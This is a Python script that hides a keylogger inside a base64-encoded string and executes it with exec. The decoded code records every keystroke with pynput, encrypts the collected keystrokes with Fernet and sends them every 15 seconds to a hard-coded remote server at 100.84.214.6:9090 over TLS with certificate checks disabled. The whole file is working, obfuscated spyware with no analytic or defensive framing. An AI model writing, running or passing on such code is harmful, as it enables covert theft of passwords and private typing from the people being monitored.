import base64

client = base64.b64encode(b"""
import ssl
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
import socket
import threading
import time

SERVER = '100.84.214.6'
PORT = 9090
listener_active = False
keystrokes = []  # In-memory storage for keystrokes

#generate a key
def generate_key():
    return Fernet.generate_key()

#for encrypting message
def encryption_message(key, message):
    f = Fernet(key)
    encrypted_message = f.encrypt(message.encode())
    return encrypted_message

def create_ssl_connection(server, port):
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    conn = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=server)
    conn.settimeout(10)
    try:
        conn.connect((server, port))
        return conn
    except socket.timeout:
        print("Connection timed out")
        return None

# SOCKETS
def send_keystrokes(key, keystrokes_data):
    global listener_active
    print("5")
    s = create_ssl_connection(SERVER, PORT)
    start_connection = "Connection started"
    print("6")
    s.sendall(start_connection.encode('utf-8'))
    s.sendall(key)

    print("7")
    response = s.recv(1024).decode('utf-8')
    print(response)
    print("8")
    if response == 'continue':
        #listener_active = False
        # Ecrypt message before sending
        print("9")
        keystrokes_str = ''.join(keystrokes_data)
        encrypted_message = encryption_message(key, keystrokes_str)
        s.sendall(encrypted_message)
        print('Keystrokes sent Successfully')

# Keylogger key
def on_press(key):
    global keystrokes
    keystrokes.append(str(key))
    print((str(key)))

# Keylogger
def keyboard_listener():
    print("s1")
    with Listener(on_press=on_press) as listener:
        print("s2")
        listener.join()
        print("s3")

def start_listener():
    print("k1")
    global listener_active
    print("k2")
    listener_thread = threading.Thread(target=keyboard_listener)
    print("k3")
    listener_thread.start()
    print("k4")
    listener_active = True
    print("k5")


def main():
    global keystrokes
    key = generate_key()
    start_listener()
    while True:
        try:
            print(listener_active)
            if listener_active:
                print("1")
                print("2")
                time.sleep(15)
                print("3")
                send_keystrokes(key, keystrokes)
                print("10")
                print(key)
                keystrokes = []
                print("11")
                # Wait for a certain amount of time or number of keystrokes
        except Exception as e:
            print(f"An error occured: {e}")


main()
""")

exec(base64.b64decode(client))